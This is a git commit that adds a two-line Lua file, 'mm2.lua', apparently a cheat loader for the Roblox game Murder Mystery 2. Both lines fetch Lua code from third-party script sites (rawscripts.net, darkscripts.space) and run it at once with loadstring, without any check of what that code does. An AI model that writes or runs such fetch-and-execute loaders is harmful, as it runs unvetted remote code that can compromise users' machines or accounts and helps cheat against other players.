908fdb2d1141d126f57e95f390384ed51c443235
mm2 <forfreeporno733@gmail.com>
2024-11-06 18:08:30 -0300

    Create mm2.lua

---
+++ mm2.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-Overdrive-H-MM-15035"))()
+
+loadstring(game:HttpGet('https://darkscripts.space/scripts/a5bace7951.lua', true))()
